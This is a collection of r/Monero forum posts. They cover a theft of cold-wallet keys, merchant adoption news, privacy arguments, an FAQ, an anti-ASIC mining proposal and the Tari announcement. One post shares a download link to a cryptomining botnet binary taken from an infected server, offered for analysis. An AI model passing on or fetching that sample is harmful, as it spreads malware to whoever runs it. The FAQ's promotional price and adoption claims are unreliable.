We will never know. Monero is private.
"
I, for one, think it would be a great show. Full of boat accidents accounts, no doubt!

There have been a few high-profile guests involved with cryptocurrency in the past, and the topic is discussed from time to time as a side dish (on the podcast) to this day.

Just a crazy thought that crossed my mind. I can't be the only one, so why not put it out there.

**edit**: As they like to say on the interwebz, that escalated quickly! Seems I'm not the only one indeed.

No peer pressure at all /u/fluffyponyza .. :p"
" A rallying cry of the earlier proponents of cryptocurrency was that 'you can be your own bank'. I learned the hard way what this means. I write this in the hope that it might help others avoid my mistakes as well as bring me some small form of catharsis by telling the story.

I learned about Monero in August 2016. I believed so strongly in the idea, I bought around 10000 USD worth, which was at the time a very large amount of money for me. Almost immediately after I bought it, the price jumped from less than 0.003 BTC to 0.02. It did so in a series of mind-boggling leaps, as I watched in awe on Poloniex along with the breathlessly excited mass that was the Trollbox. 

I wanted to help out. I have a scientific but not technical background, yet tried to engage with the community insofar as I could. I made a [simplification](https://www.reddit.com/r/Monero/comments/55dhkf/taushet_usb_monero_cold_wallet_generator/) of the best-practice guide to making a cold wallet that has been downloaded several thousand times. I made an [implementation](https://www.reddit.com/r/Monero/comments/5ut93j/monero_brainwallet_generator/) of luigi1111's wallet generator that could create brain wallets (much to the chagrin of several devs, admittedly). I made some limited changes to the GUI code and core code. I got an 'XMR Contributor' hat on reddit. Much pride. I [performed an exploit](https://np.reddit.com/r/dashpay/comments/5t6kvc/lazy_masternodes_do_you_actually_have_to_do_any/) in another coin's incentive structure, and was told to go away as it would only matter when/if people actually used that function of the coin. In short, I enjoyed the community and tried to do what I could.

I sold some of the XMR to buy a half-rack and filled it with 20 GPUs and started mining. In the early days, I was well over half the hashrate of supportxmr.com, and used my power irresponsibly by forcing u/M5M400 to acquiesce to my unreasonable demands of unprofessional christmas themes and angelfire-esque javascript snow effects. 

The heat caused the otherwise deep snow covering the roof of my garage to sizzle away, making it significantly stand out, likely from space. Together with my electricity bill, this caused several inquiries, some more official than others, demanding what was occuring there. I happily described what I was doing to those who asked. This openness turned out to be an expensive error.

A decent while later, I came home to find that the safe in which my private keys were kept had been carefully removed from the wall. Several other areas had been searched. Nothing else had been taken. At that moment I found myself needing to come to terms with losing just over 7000 XMR. After a few quick phone calls, I discovered that home insurance would understandably not cover anything more than the safe. There was nothing more to be done. 

The months that followed were not fun. I almost entirely withdrew from the community. The vagal dread that tore into my stomach every time I read about crypto hurt too much. My miners failed, one by one, and I could not find the motivation to turn them back on. I watched as the price skyrocketed further such that my phantom holdings have risen to the current equivalent of around 3 million USD. The experience is at times sobering and at other times numbing. In all, I am simply grateful that my errors did not lead to any of my loved ones ever being physically hurt or threatened - it certainly could have gone down differently. I am also grateful to have been a very, very small part of the crysalid phase of what I still believe can be a world-changing technology. 

So here is the take-away, boys and girls: being your own bank entails not only financial and fiscal freedom from the big bad men in suits, but also means that you have full responsibility for the safety of your magic words that hold your wealth. 

Learn from this.

"Hi guys,

Since Forbes [broke the news a few hours early](https://www.forbes.com/sites/laurashin/2017/12/05/cryptocurrency-monero-to-be-accepted-by-45-musicians-such-as-mariah-carey-g-eazy-sia-for-holidays/#5ea3ff447885), I figured I'd put this up a few hours early;) I know you’ve been patiently waiting for details on the GloBee Secret Project, and today we deliver.

Naveen Jain and I have been working on Project Coral Reef for the last couple of months, since [the FFS campaign was fully funded](https://forum.getmonero.org/8/funding-required/88459/globee-s-secret-project-fundraiser).

Our original goal was to get like 10 high profile artist stores to accept Monero, and I am pleased to announce today we have over 50 online stores accepting XMR payments. Many of these stores are also offering an exclusive additional 15% discount on orders paid with Monero. These stores in aggregate get millions and millions of impressions and every store customer will see Monero during checkout even if they end up paying with fiat currency. You can see all participating stores and artists at [ProjectCoralReef.com](http://projectcoralreef.com).

There are several reasons we went for musicians instead of trying to canvas something like Newegg. The first is that a lot of those stores already accept Bitcoin, which means you can already use Monero on them via xmr.to and similar. The second reason is that the Newegg target audience largely already know about Monero, or have at least heard of it. The third reason is that it’s hard to incentivise people to purchase GPUs with Monero.

Music fans, on the other hand, are rabid. If they can save 15% on a purchase, or get something exclusive, but have to jump through hoops to do so they absolutely will. ""Tricking"" someone into using Monero is really the first step to their achieving financial sovereignty.

We’re also aware that there are lots of pieces of the ecosystem that are weak, such as mobile wallet support and easy ways to purchase Monero, but many people are working on improving that status quo. And as these parts of the ecosystem are built out, there will be further interest from the same journalists who are reporting on Project Coral Reef right now.

And, too, this is just stage 1. There will be more coming next year from the same team that put this together. The biggest thing that Coral Reef has given us is leverage, due to the high profile nature of it, and we will be using that leverage to open doors elsewhere. Stay tuned!

Lastly, I’d like to give a VERY special thanks to all those that supported the crowdfunding campaign, without which this would not have been possible!"

"A recurring theme on most subs is that we should trust Bitmain because they have too much to lose if they are caught abusing their power.

It's probably true: it is not in Bitmain's interest to disrupt any currency.

So what?  Detonating a nuclear device is not in your neighbor's interest. Do you want to live in a world where your neighbor owns a nuclear device?

The point is: we should not have to trust Bitmain, period. Whether they are trustworthy or not is completely beside the point. Monero is supposed to be trustless.

Even if Bitmain was trustworthy, which I have reasons to doubt, they are located in China.  Their mere existence means that a totalitarian government is able to seize a majority hashpower on a whim and attack Monero. And a state that does stuff like this
https://np.reddit.com/r/technology/comments/8aovfb/china_has_started_ranking_citizens_with_a_creepy/ should be kept as far as possible from Monero. 

This community demands trustless, not 'trustless because it's not in their interest to pull the trigger'. If we allow a majority hashpower to be controlled by a couple of players we will have the illusion of decentralization, not actual decentralization.

edit: gold & r/monero 's front page! Thank you kind strangers!"

"I am looking at moving a lot of my assets into Monero because I believe privacy is the future.  However I don't know how Monero is much different from Bitcoin.  If anyone could explain it to me, I would be greatly thankful.  Could another reason for getting into Monero be the future implementation into the [Karbon Platform](https://karbon.io) ?  I only ask this because it would be nice to be able to buy/sell and receive XMR with the ability to spend it on a debit card."

Just keep doing what you're doing. Y'all are what crypto should be imo"
So I would like to wish everyone here a merry Christmas/happy holidays. Don’t be like me hold your family close and enjoy the holidays you never know when they will be gone!!!!!
"I'm writing this post because I am tired of people attempting to equate Monero's features with criminal endeavors. It is an unacceptable prejudice that I see being raised against Monero time and time again, and I will explain below the reasons why privacy matters in completely lawful ways.

I'd also like to make it very clear that I have not, nor am I ever interested in committing or facilitating any sort of crime with Monero, and yet I am super passionate about Monero – who would have thought? What i'm saying is, that it's perfectly ok to desire privacy as a good Samaritan, and people should not feel ashamed or guilty for wanting privacy over their finances.

I have conducted a few transactions with Bitcoin, and part of this process has been to check for confirmations to come through before the transaction can be considered 'complete'. Being the curious and bored person that I am, I have had a look at the originating Bitcoin address of the person whom I was transacting with and could see their BTC balance in broad daylight. The problem with this is that you then know their Net worth (at least in BTC) and sometimes they have had quite a lot of money.

The issue here is if the other person personally knows you during a transaction, or can get any sort of  information on you, or if you provide a residential address for shipping etc. – you could quite potentially have them use this against you for personal gain. It doesn't matter If you have $100 or $100,000k  – if somebody can find personal information by researching about you, or you provide your home address for postage – then they could potentially target you in order to rob you of said Bitcoins. 

A criminal could rob you in the night at gunpoint, demanding  access and possession over your Bitcoins “or else you get it!”. This is a very dangerous situation that people should have the right to protect themselves from. I felt really uncomfortable about this and stopped transacting ever since.

I don't see how people with high Bitcoin balances can feel safe transacting with anybody whom they might already know, or for something that will be shipped to their residential address. Even if the only information they are provided is a username, more information can be dug up over the Internet. 

Also privacy is a basic human right. I don't want people watching me jerk off, take a shit, going through my personal belongings, or looking into my house through the windows watching me eat dinner at night. I also don't go handing out my bank statements like candy to friends or post them on the Internet.

I also don't want to get paid by somebody in Bitcoin, only to find out later on that they were  Bitcoins associated with a history of crime. If an exchange black-lists this Bitcoin then they are harder to sell (or depreciate in value) and that is not fair. What if they are seized from you? What are consumer protections for this kind of scenario? Are people expected to do their own chain analysis before doing any sort of transacting?

People should be able to feel safe when transacting in crypto-currency, not paranoid that people can see their net worth and have a target over their heads as a result. People do crazy things for money and is thus why most people keep their net-worth and possessions private from prying eyes.

You don't put up a flashing neon sign on the roof of your house saying “my wife owns $50,000 in jewelery, i'm telling you this because privacy is a crime”. 

These are all points that cannot be swept under the rug. **Please do not be made to feel guilty about privacy because privacy is simply safety. Safety for you and your family.**

Thank you."
"I mean... that's like 95% of the posts in other crypto subs.
Those rules are what's keeping this sub interesting and constructive."
"Privacy is a right. It’s not something to be looked down on. It’s not something only criminals need. It’s something that belongs to everyone, and something that everyone deserves.

Monero is not a “privacy coin.” It’s a fungible currency, and privacy is a means to this end.

We need to stop calling Monero a privacy coin. It isn’t. But transparent blockchains like Bitcoin are surveillance coins, and we need to start calling them that."
"*[What is Monero (XMR)?](https://getmonero.org/)*

Monero is a secure, private, untraceable (crypto-)currency. It is open-source and freely available to all. Don't believe us? [Click here.](https://github.com/monero-project/monero)

Monero is a tool that people can actually use. It makes receiving payments hassle-free, since **merchants and individuals no longer need to fear the source of funds they are accepting**. With transparent systems like Bitcoin, Ethereum, Verge, or Dash, these people need to hope (or spend substantial resources verifying) the sender did not use the funds illicitly. Furthermore, merchants do not want all their vendors known, and individually do not want everyone to know how much they are spending. If I spend more than I should at Newegg (store), that's my own business.


Monero is different because *every transaction* is **always private**. There is no way for pools and exchanges to opt out of sending private transactions. Thus, Monero's anonymity set far exceeds any other coin's anonymity set. [Over 86,000 transactions in the past month of August, 2017](http://moneroblocks.info/stats/transaction-stats) hid the sender and receiver, and about 99.95% of them also hid the amount (will increase to 100% of *all* new transactions in September)! There is no suspicion in using a private transaction, since all transactions are private. A single transaction does not stick out.*

This privacy is afforded with the **best technology**. I implore you to take a few minutes to learn about the four main technologies that Monero uses to provide privacy:


* 	**Ring signatures** hide where the money comes from. Spent inputs in a transaction are hidden among several others that also appear to be spent. Thus, no one knows which source of money is actually being spent. Think of inputs as individual dollars or euros. [View a video about this topic here.](https://www.youtube.com/watch?v=zHN_B_H_fCs) Note: this is NOT the same as mixing.


* 	**RingCT** hides the amount. Instead of spending a known value of an input, you can cryptographically commit to a certain value without revealing what the value actually is. This is a very complicated topic, so please [view this video for more information](https://www.youtube.com/watch?v=M3AHp9KgTkQ).


* 	**Kovri** is a work-in-progress tool to hide the transaction broadcast. Kovri will make it easy for users to hide their IP address when telling the network that they would like to make a transaction. Kovri will work with other cryptocurrencies and other projects through a common API, and Kovri can be used in a way to hide that you are using Monero at all. Kovri adds additional layers of network security for miners and pools, and it allows for the highest level of censorship resistance possible. [A video for this project is available](https://m.youtube.com/watch?feature=youtu.be&v=cxgbLI6IZGs), and you can also check out the [Kovri website](https://getkovri.org/). In the meantime, there are several guides to using Monero with Tor that work today, including an [unofficial Tails build](https://garlicgambit.wordpress.com/2017/04/16/monero-gui-on-tails-3/).


* 	**Stealth addresses** hide where the money goes to. Instead of sending money to a specific address directly, certain outputs are allocated for addresses, but outside observers do not know which addresses these belong to. Even if ring signatures were compromised for some reason, then people would still not know the sending address in a transaction thanks to stealth addresses. [View a video about this topic here](https://www.youtube.com/watch?v=bWst278J8NA).


There are several other things that make Monero great! It has a smooth tail emission, dynamic blocks and fees, and an accessible Proof of Work (mining) algorithm.

*You can optionally choose a very large, unusual ringsize to make the transaction stick out. This is not recommended, and normal users who leave the ringsize at the default setting will not experience any issues. Also, it's possible for a user to manually add identifying information to the tx_extra field, which is something that a user must seriously go out of their way to do.



*Now you know Monero (XMR) has the best technology. What else makes Monero (XMR) different than other cryptocurrencies?*


*   **Fungible:** Every Monero remains equal and identical to any other Monero. It is the property of a crypto asset whose units/value are capable of mutual substitution no matter what historical transactions occurred in the past.


*   **Value-Growth:** Monero has a proven chart record of growth and will continue to grow. Don't believe us? August 2015: $0.45, August 2016: $12, August 2017: $100. Growing really fast right? The difference is that it is growing because it's being used appropriately for it's technology and the demand keeps increasing. Swiss banks and offshores management organizations are starting to move from physical assets to Monero (XMR). Monero is dedicated to continue growing. 


*   **Development-Growth:** Monero has the best team. [Over 270 contributors](https://www.openhub.net/p/monero) have brought Monero to where it is today. The vast majority of people donate their time to help Monero, but a few get paid through the [Forum Funding System (FFS)](https://forum.getmonero.org/6/ideas). This is how Monero can be a strong project despite not taking a portion of the block rewards or launching with a premine.

*Am I a bad person to consider using this?*


No, Monero is freedom money. You can do whatever you want with it, whenever you want, where ever you want. We make it clear that you should own your wealth 100%. What you do with it, is none of our concern.



*Where does the word Monero come from?*


The word Monero comes from the language Esperanto. Monero means coin or/and currency. The plural way of saying Monero in Esperanto and in our cryptocurrency is Moneroj.

*Is there a lightweight wallet for Monero?*

Not yet, but you can use the official GUI with a remote node.

>
>

*Are there any other ways to store Monero (XMR)?*


Yes, there are many mobile wallets out there that allow you to store Monero (XMR). We do **not** recommend them, because they are not official releases of Monero. If you do decide to use other wallets, please make sure to do your research first before storing any Moneroj in the wallet. Anything used for Monero outside of official releases, will be used at your own risk. Some may be used for scamming purposes. If you still decide to take the risk; do not use them for large amounts. Also keep in mind that there is a high chance that Monero support will not be able to help you if you bump into any problems from applications outside of official releases. Why should you not use non-official wallets? Well would you buy a house and give your only key you have to the builder/management and wait for him/her to open the door to the house you supposedly own? No. Same goes with cryptocurrencies. You should always have possession of your private keys, and your Moneroj. Most non-official releases own your private keys, therefore you do not own the Moneroj.

"We just discovered that one of our servers is infected with a monero miner when a user reported slow response from an app hosted in it.

I'm a miner myself, but I haven't seen this kind of mining software. I secured a copy of the mining software and will try to pick it apart. I'll post my findings here for some data on botnets, like their pool, the ports they use, the address (if it's even useful), etc.

Edit: if there's a way for me to upload it without being flagged as malware, please let me know so I can upload it and everyone can try to dissect it.

Update: i found a way to upload it online. I used sbit3.me, safe site, like a pastebin for files. Here's the url: http://sbit3.me/d/UtvFY

"What the entire Monero community doesn’t seem to understand is user friendliness, marketing, and the need for easy wallets (hardware and software).

Yes, XMR is amazing technology. Yes, the devs and community are second to none. I love Monero!

But nobody outside of this community cares about all that. They want great wallet support, more exchanges, and steady returns.

As /u/ puts it:
""GUI is a joke too. can't connect to a remote note by default (you have to research first), you have to sync for a while even using remote node.
It's just not user friendly, at all. And the devs don't put this into priority.""

This is exactly the reason Monero is now #14 and has a low 24-hour volume.

Guys, if we want Monero to have a wider social impact we NEED wider use. The only way to get this is to make it user-friendly.

"I have been involved in and out, dabbling with cryptos since around 2012.

There are some great cryptos out there and there are some super shit coins too (ahem ripple).

I have speculated and hedged on various cryptos and have had some small successes in financial gains. Monero, it's nature and embrace of freedom and privacy is my favourite coin and I believe it has a truly bright future and I'm behind it 100% & will support it as much as I can with bandwidth, storage and mining.

Long story short - This is the best crypto community and best crypto currency there is today. I believe in Monero from the pure crypto spirit and utility. I have moved from running a raspberry pi full node to a full on UPS backed HP server.

"Four years ago today (18-04-2014), the Monero (then Bitmonero) genesis block was created. The journey from then ‘til now has been anything but smooth, with everything from intentionally hobbled miners, time warp attacks and threats, through to secretive ASIC mining and upcoming scamforks.

But Monero, where it is today, and the trajectory it is in for future development and adoption, is nothing short of amazing. With that in mind I would like to thank from the bottom of my heart, the core development team (past and present), all of the many github contributors and developers of third party services, and of course the fantastic community.

What has been accomplished in the past 4 years makes me proud to be a part of this journey with you all. I look forward to looking back in another 4 years time and seeing where we go from here.

"We are a young company from Sweden producing jerky out of reindeer, deer and elk meat. Even if our company sounds like it is an old school manufacturing business we have young minds! Today we started accepting XMR through Coinpayments. We also accept other cryptos.

The reason for us to start accepting XMR is the fact that all of us three founders are cryptomaniacs and we truly believe in its usability and in it long term. It is too sad to see that holders of XMR cannot actually spend their coins on too many e-commerces but are forced to buy their goods with fiat. We want to be one of the first ones to change this!

"I propose the following algorithm to end this War of attrition with ASIC / FPGA manufacturers , hopefully once and for all and save us Precious PoW Tweaks during the upcoming forks.

> ""A time-locked, Proof of 'Non-ASIC work' Challenge reward algorithm""

Here's an image to help you visualise how the algorithm works (details below):

[https://imgur.com/a/9S8dA](https://imgur.com/a/9S8dA)


**Here's why we need it:**

ASIC manufacturers mine in Secret to attack our decentralized network. They'll win the war since they'll 'get their investment back' before we brick their ASICs, allowing them to launch never-ending attacks against our decentralization, for eternity.

**Quick Overview**

This algorithm uses the concept of ""time-locked reward challenges"".
 
The algorithm ‘time-locks’ the reward, then issues a ‘non-ASIC’ work challenge during each regular PoW Fork, which distributes mined rewards only to CPU and GPU miners who can pass the challenge and prove they are not ASICS, by maintaining their hashrate during the ASIC downtime.

These Hash-rate challenges after PoW Forks successfully  ‘detect’, and ‘Severely Penalize’ anyone Mining with an ASIC/FPGA, even those in Secret.

------------------
**Proof of Concept: An Actual Demonstration**

I'll demonstrate this algorithm in action:

Please see this image to help you Visualise how the algorithm works:

[https://imgur.com/a/9S8dA](https://imgur.com/a/9S8dA)

There is a critical flaw and uniquely identifying feature that exists in absolutely 'ALL ASIC and FPGA miners', even those mining in Secret.

As most of you may know, with the upcoming V7 PoW hardfork, 

* An ASIC miner’s hash rate component drops to Absolute zero for a set period of time afterwards, because their ASIC function can no longer be used with a PoW tweak.

* Normal GPU and CPU miners are also very easy to identify; as they have no problem maintaining a relatively similar maximum hash rate after the fork.

**Instead of just destroying an ASIC with a fork, we can further exploit this to attack the ASIC Manufacturer or Miner by taking back all their mined rewards and giving them to the community**

The Special timeframe is *PoW Fork + 'N' Days.* ('N' being however many days remaining where it would be ""impossible"" to build and startup a new ASIC/FPGA after the fork.)

To exploit this, the algorithm introduces a period of time called the ""Mining Rewards Collection Timeframe"" (MRCT), the time period in between regular PoW Hardforks.
the grey shaded area in this [image](https://imgur.com/a/9S8dA)

This ""Mining Rewards Collection Timeframe"" is a time whereby all mining profit rewards are 'time-locked' or held hostage in escrow, 
on either the mining pool, or on the Actual Blockchain code itself, or Both, depending on where this algorithm is eventually deployed.

The algorithm stores the *wallet address a mining reward belongs to*, and  *the maximum hash rate* (or maximum value adjusted share rate per day) observed during the ""Mining rewards collection timeframe"" for that particular wallet address.

This ""Mining Rewards Collection Timeframe"" can be of any duration as required by the developers; 1,2,3,4,5,6 Months or longer .
The longer This Timeframe, the more dangerous it is to ASIC miners. Meaning we don't have to rush with forks.

Since it's time-locked, mined coins/rewards cannot be cashed out until the coming challenge; 
However, mining pools can still choose to payout smaller miners before that time if they have a 'good stable Non-Asic Hash challenge passing history', or a deposit on file, or at their own risk, so most good miners don't have to wait to cashout rewards!. Big miners on the other hand, won't care! Why? Because the delay doesn't cost them anything. (it's a TINY TINY inconvenience compared to the damage ASICs would do to GPU mining profits. I hope this makes sense)

**Now for the Critical ANTI-ASIC Work Challenge.**

Time passes and the *mining rewards collection timeframe* ends with a Hardfork that changes the PoW algorithm slightly, 

All ASICS and FPGAs are INSTANTLY destroyed.

At the same time, the mining rewards from that collection timeframe are now ready to be paid out.

Since only the CPU / GPU miners are able to hash normally, 

The Algorithm now issues a *Hash Rate challenge* to determine how much of the coins mined were actually mined by ASIC or FPGA miners.

The challenge is nothing special. Miners just have to leave their miners running normally at maximum speed for the period of the challenge,  same as they do everyday!

During this challenge, their *""Average Maximum Hash rate during the challenge""* is compared to the *""Maximum Hash Rate speed""* recorded on the blockchain during the *Mining Rewards Collection Timeframe*. 

See the green dotted line in the [image](https://imgur.com/a/9S8dA)

Thus at this point, since ASICs are DEAD, they cannot Hash at the same rate during this challenge period, so any significant difference in hashrate would thus clearly indicate the use of an ASIC or FPGA miner.

Now, we have all the information we need to STRIP ASIC Miners of ALL their gains, and Reward GPU miners instead.

As shown in the earlier [image](https://imgur.com/a/9S8dA)

* **Example 1**: A miner using PURELY 100% CPU and GPUs to mine, will easily pass the challenge as though it never happened. They can easily maintain 90% or more of their maximum hash rate recorded, well within the agreed margin of error. So they get the Full 100% Mining Reward, Plus a fair share of any of the coins forefitted by the ASIC Miners as a Bonus., (ie, 101% , or more.. possibly)

* **Example 2**: A miner hashing with 100% ASICs or FPGAs, will be dead during this challenge and can match “0.00%” (ie, Nothing) of their maximum hash rate observed. As such, they proportionally also get “0.00%” of the rewards they mined and forefit all their rewards to other miners.

* **Example 3**: A miner hashing with 60% ASICs and 40% CPU/GPUs will only be able to maintain 40% of their Maximum hash rate during the challenge period. As such, they proportionally only get 40% of all the Mining rewards they earned and forefit and Lose the 60% of all coins mined by the ASIC miners. 

What if a 1 GPU breaks in a 12 GPU mining farm during the challenge? (Very rare) or for some reason, you can't mine during that period? then the miner can simply rent the GPUs from nicehash for the Challenge. An ASIC miner however, cannot use this strategy (because ASICS are not GPUs, explained further below).  Also we can implement a 2nd chance option; the confiscated reward may be frozen for the next Cycle; and the miner may get a 2nd chance to prove the hashrate again, with a % reward penalty.

The Beautiful thing is that If ASIC miners fail the challenge, Everyone gets a Bonus share of the Reward Forefitted by the ASIC miners, 
So Everyone wants the ASIC miners to fail so they get Free extra money.
and thus have a *financial reason* to support this algorithm.

*There is no escaping it... or is there?

---------

**Is it ASIC PROOF? Can you Cheat this algorithm?**

I've also tried to see if you can work around this algorithm:

* **Example 1**: What if they switched in GPUS to mine for an ASIC during the challenge? Well, that wouldn't work. When the challenge comes, they can either save the rewards mined by the GPUs, or save the rewards mined by the ASICs, One will always be lost and result is the same anyway because you'd only get paid for the Hash rate of the GPU. The ASIC portion of the hash rate will ALWAYS be lost. 

* **Example 2**: What if they use the GPUs to mine a different coin and have them only hash for the ASIC during the challenge period? 
- Consider the Antminer X3. at 200KH/s, to support just ""ONE ASIC"", they would need over 200 RX 580 Cards or 100 VEGA cards to pass the challenge... costing well over $60,000 (SIXTY THOUSAND DOLLARS) and if they depreciate at ~ 10~15% a year, they'd lose $6000~$9000 a year. 
it's not enough to cover your losses, 
- Also, What other coin could you mine? If ASICS are so powerful, there won't be another coin except those running this algorithm. Then, the dev can choose to issue the challenge at the same point as the other coin using the same algorithm, so they lose all rewards from one coin as 1 rig cannot sustain two challenge algorithms at the same time.

* **Example 3**: What if they just leave some GPUS on standby to avoid the power costs? Then ASIC's would still be unable to be mass produced anyway. Because for every ASIC Mass produced, you'd need to Mass Produce 200 times the GPUS to support them in their place, and own of all them. practically impossible.

* **Example 4**: What if they rented hashing power from Nicehash to fill in during the Challenge period? 
- Yes, but so can we! The beautiful thing about this algorithm, is if we rent the limited hashing power on Nicehash first before them at break even or loss, it doesn't matter, Because, the ASIC miner cannot rent and hash rate and will fail the challenge, and Forefit the ENORMOUS amount of Rewards to the community. Imagine, Mining at such a high rate for months on end , the rewards confiscated and paid to GPU miners will easily offset any of the tiny losses renting hashrate from Nicehash, so ultimately, The ASIC miners lose Everything, and the community (you and me) gets all their money.
- Also if ASICs Dominate the crypto market, there won't be any GPU to rent, all remaining coins would be mining this algorithm, meaning they would have to save their own hashrate for themselves, not rent it to ASIC miners. otherwise they lose their reward. Brand new users may rent their GPU's but its no where near enough to cover the ASIC hash shortfall in the challenge.

* **Example 5**: What if they waited till we exhausted our supply of PoW fork tweaks? That's the beauty of this algorithm!. We don't actually have to tweak the PoW algorithm on a constant basis! We can intentionally leave it the same. So Everyone passes the Challenge, Then when we do detect an asic ""trying to Mine their Money Back in secret (as they do now)"", We tweak the PoW at the Next Hardfork. Destroying and bankrupting their very first attempt, and we get all their money and rewards, So there's no need to waste a PoW tweak in a pre-emptive strike, because the rewards are Time-Locked to the future. We can lie in wait with a single PoW like a Trap, and eat them alive (literally we get all their rewards after the challenge!). We can maintain this lethal threat to ASIC manufacturers without having to change the PoW at all!

And remember, all this effort is just for ONLY, *ONE* ASIC. meaning you Can't mass produce it.

So ultimately it wouldn't even make sense to even develop an ASIC, as you'd be far more profitable just mining only with the 200+ GPU's required to cheat the algorithm.

**So in summary, **

* No ASIC/FPGA miner can escape the challenge. Not even those running in secret.
	
* All ASIC miners are guaranteed to suffer a huge (possibly fatal) financial loss, with no prospect of any return on investment.
Time locked rewards ensure No secret pre-mining with ASICs is possible. ASICs are destroyed with each challenge, all R&D and manufacturing costs and the electricity bill used to power them is wasted for basically ""ZERO returns"", 

*  …..and lets not forget that all their rewards gets given away to other honest miners like you and Me!.  ( LOL!) or potentially the developers of the fork :)

* As long as the algorithm is active and used by multiple coins, no ASICs will ever exist to mine in secret, 

* We save precious PoW tweak changes, since there's no need for a pre-emptive PoW strike to prevent 'ASIC hit and run' pre-mine scenarios.

* ASIC manufacturers see that the war is un-winnable and go invest in other things, 

So, in theory, The War Ends. (at least for a very good part of the future)

As they say: "" Don't build a wall and hide in fear.... Build a wall and launch missiles from behind it against the enemy so they will never dare attack us again.""

*I would like to point out that time locked reward challenges are already in use by the Olympic games to Strip drug cheats in the past by storing samples and testing them in the future, and it's also in the PPLNS minig pool algorithms to deter pool hopping cheats, and also in the Bitcoin's Lightning network in the form of decrementing time-locks"" that 'enforce the transfer of funds' under certain conditions.*

**Is it beautiful? Will it work? Can it be done? Let's discuss this**

"## What is Tari?

Tari is a decentralised assets protocol that is going to be built on top of Monero. Think of it as something like coloured coins or CounterParty, but for Monero and a lot more scalable (ie. not using an embedded consensus mechanism).

## How is it built ""on top of Monero""?

Tari will have a native token, like Counterparty, but it will operate as a merge-mined sidechain. Miners will be able to earn Tari block reward and fees as they mine Monero. In addition to binding itself to Monero's security model, Tari will also support atomic swaps between itself and Monero.

## Who is building it?

Everyone! Tari will be an open-source project very much in the spirit of Monero, to the point of reusing a lot of the patterns we've developed for Monero over the years. However, it will initially be a little bit more centralised than Monero, which is fine as it is a layer 2 project that can afford to experiment a little without impacting on the purity of Monero's robustness and decentralisation.

This early form of centralisation comes in the form of the Tari organisation, which will act as a steward of the protocol in much the same way as the Monero Core Team acts as a steward of Monero. However, we have also formed Tari Labs based out of Johannesburg, South Africa, and we are in the process of hiring researchers, developers, and others, who will be among the first contributors to Tari.

That said, we do not believe that Tari Labs should be the sole owners of the ever-evolving design and architecture of the protocol, nor should they be the decision makers. They are merely a bunch of clever people working alongside anyone in the community that wishes to contribute to the Tari protocol.

If you would like to work at Tari Labs, and live in South Africa or are willing to relocate, then please do look at the [available positions on the Tari website](https://www.tari.com/contribute/#lever-listings). Please note that on principle Tari Labs will not employ existing Monero contributors, so as not to place a drain on the relatively limited developer resources available to the Monero project.

## You keep saying ""we""...who is ""we""?

Tari has been founded by myself (Riccardo Spagni), Naveen Jain, and Dan Teree. You can read more about us, as well as some of the other contributors to this very nascent project, on the [About](https://www.tari.com/about/) page on the Tari website.

## So you're doing an ICO?

I will slay you where you stand.

## Well then how will you pay for this?

I've decided to sell my watch and my power glove, obviously:-P

Seriously, though, Tari is backed by some of the world's leading top-tier VC firms, such as Redpoint, Trinity Ventures, Canaan Partners, Slow Ventures, Aspect Ventures, as well as some of the leading blockchain VC firms.

## How does this benefit Monero?

Our investors believe in what we want to build with Tari, but they also believe in Monero as the world's leading private digital currency, and also as a powerful base layer upon which projects can be built. Because of this, we have capital that we are using to not only build the Tari protocol, but to enhance aspects of the Monero software stack and ecosystem.

Consider three examples of areas the Tari Labs team will be focusing on over the next year:

- Researchers will work with the Monero Research Lab to identify ways to improve Monero's block and transaction propagation. This will increase on-chain scalability for Monero, as well as speed up initial syncing of nodes. Tari Labs developers will also assist the Monero development community by implementing some or all of these improvements.

- Tari Labs developers will work with Tari Labs researchers to create and implement an atomic swap mechanism that will initially allow for atomic swaps between Monero and other cryptocurrencies, such as Litecoin, but will also be used later on for atomic swaps between Monero and assets issued on Tari.

- Developers at Tari Labs will work on a Lightning Network router implementation that supports both Bitcoin and Monero, allowing Monero to benefit from the added off-chain privacy that LN provides.

In addition, Tari has plans for ways we can more directly support Monero development in the future through the creation of development hubs around the world, where people will be able to apply for grants that will let them work on Monero or Tari for a period of time. This concept, whilst still in its infancy and quite far away from inception, will provide people with the opportunity to contribute to the Monero codebase, research, and ecosystem on a more regular, full-time basis.

## Does this mean fluffypony is leaving Monero?!

No, not at all! In order to free up time for me to work on Tari I have taken two major steps in my professional life:

1. I have stepped down as CEO of MyMonero, and have handed the reins to the very competent [Paul Shapiro](https://twitter.com/tweetingpauls) (aka endogenic). We are in the process of the last few bits being totally handed over, after which I will be non-operational on MyMonero.

2. I have stepped down as CEO of GloBee, and have appointed a new CEO to replace me, [Felix Honigwachs](https://twitter.com/CryptoCat_ZA). Felix comes with a wealth of experience, having been a senior manager at Microsoft and at SAP, and more recently having been the founder and now-former CEO of one of the most influential healthcare software startups in South Africa. I have already become largely non-operational on GloBee as Felix has slid nicely into the role, even taking over my office and making me move to our management company's offices next door;)

That said, over the past year I've been reducing my roles within the Monero project itself, in order to ensure I am never a bus factor. Members of the community have stepped up to fill these roles, including Monero Core Team member luigi1111 taking over as lead maintainer on the Monero website and Monero GUI repos. I am determined to further reduce any reliance on me over time by continuing this trend, with an eventual goal of handing off the task of lead maintainer on the Monero CLI repo once we have added full support for deterministic builds.

My role in Monero will then solely focus on advocacy for Monero and privacy, technical advice and counsel to the contributors and maintainers where necessary, and I will continue to serve on the Core Team for as long as I am required and able to. In addition, I will also be spending a lot more time on the [Monero Enterprise Alliance](https://mea.business), which I hope to one day meme into existence.

## What technologies will Tari be buit in?

While some of the moving parts will be determined among the development community as it comes together, one thing we have already decided on is to use Rust as our language of choice for the Tari protocol software. The decision to use Rust is partly because we believe that Rust is an incredibly capable language that is purpose-built for lower-level high performance software like this, but largely because we want to make sure that Tari does not drain any of the existing Monero contributor support.

## This all sounds exciting...where do I sign up?

As mentioned before, we're reusing a lot of the patterns that have served the Monero community well over the past four years, some of which I'm directly responsible for and was quite surprised they worked at all;) The best places to join in the discussion and get involved with the burgeoning community are at:

"Hi All

Just performed a new push, here are the news:

**Status**

On the client side:

After the first push request and discussion with members of Monero team, I had to review and change my integration.

This new integration fully support send/receive moneroj, including with subaddress.

Moreover it minimize the core crypto code modification and 
will allow integration of other HW in a (I hope) easy way.

This last push request is now under review and is a candidate for an expected merge \o/

On the device side:

It remains to finish and debug some man-in-the middle counteract.

The doc has been updated but it is not fully finished yes.


**Next**

What's the next step:

Once merge will be done, a double strong test phase will have to done. 
The first to ensure nothing is broken without device. 
The second to ensure send/receive is ok with it.

After that it will be time to think to integrate more features, in that order:

